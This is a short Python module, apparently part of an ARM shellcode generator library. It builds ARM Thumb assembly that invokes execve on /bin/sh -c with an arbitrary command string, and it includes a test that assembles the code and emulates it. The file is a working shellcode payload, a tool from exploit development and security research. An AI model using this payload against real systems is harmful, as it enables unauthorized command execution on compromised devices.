# /bin/sh 
def generate(cmd='echo hack_the_planet'):
    """Executes /bin/sh with arguments

    Args:
        cmd(str): arguments (default: ``echo hack_the_planet``)
                  for example: "uname -a; ps auxwww; netstat -an"
    """
    sc = """
    mov  r0, pc
    adds r0, #22
    mov  r4, pc
    adds r4, #26
    mov  r5, pc
    adds r5, #25
    subs r6, r6, r6
    push {r0, r4, r5, r6}
    mov r1, sp
    movs r2, #0
    movs r7, #11
    svc 0
bin_sh_1:
    .asciz "/bin/sh"
opt_1:
    .asciz "-c"
cmd_1:
    .asciz "%s"
    """ % (cmd) 
    return sc

def testcase(cmd='echo hack_the_planet'):
    import ARMSCGen as scgen
    sc = scgen.ks_asm('thumb', generate(cmd))[0]
    sclen = sc.find(cmd)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
